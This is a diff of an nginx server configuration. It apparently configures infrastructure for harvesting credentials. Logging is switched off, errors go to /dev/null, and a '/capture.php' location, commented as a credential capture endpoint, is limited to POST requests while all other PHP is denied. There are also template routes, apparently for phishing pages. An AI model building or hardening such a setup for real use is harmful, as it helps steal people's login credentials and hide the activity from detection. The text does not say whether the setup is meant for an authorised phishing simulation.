@@ -37,19 +37,15 @@ server {
     access_log off;
     error_log /dev/null crit;
     
-    # PHP processing
-    location ~ \.php$ {
-        include snippets/fastcgi-php.conf;
-        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
-        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
-    }
-    
-    # Credential capture endpoint
+    # Credential capture — only POST to this exact path
     location = /capture.php {
         limit_except POST { deny all; }
         include snippets/fastcgi-php.conf;
         fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
     }
+
+    # Deny all other PHP execution
+    location ~ \.php$ { deny all; }
     
     # Template routing
     location /templates/ {
